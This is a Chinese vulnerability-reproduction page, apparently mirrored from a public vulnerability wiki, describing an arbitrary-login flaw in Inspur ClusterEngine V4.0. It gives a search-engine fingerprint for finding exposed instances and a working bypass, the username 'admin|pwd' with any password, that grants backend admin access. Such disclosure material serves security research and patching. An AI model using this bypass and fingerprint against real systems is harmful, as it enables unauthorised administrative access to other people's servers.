---
title: "浪潮ClusterEngineV4.0 任意用户登录漏洞"
date: 2026-10-16 09:10:57
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "浪潮ClusterEngineV4.0"
tags:
  - "浪潮ClusterEngineV4.0"
  - "漏洞复现"
---
## 漏洞描述

浪潮ClusterEngineV4.0 存在任意用户登录漏洞，构造恶意的用户名和密码即可获取后台权限

## 漏洞影响

```
浪潮ClusterEngineV4.0
```

## 网络测绘

```
title="TSCEV4.0"
```

## 漏洞复现



登录页面如下



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202091850344.png)



```plain
USER： admin|pwd
PASS:  任意
```



成功登陆后台

部分功能是无法使用的



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202091850228.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E6%B5%AA%E6%BD%AEClusterEngineV4.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md)
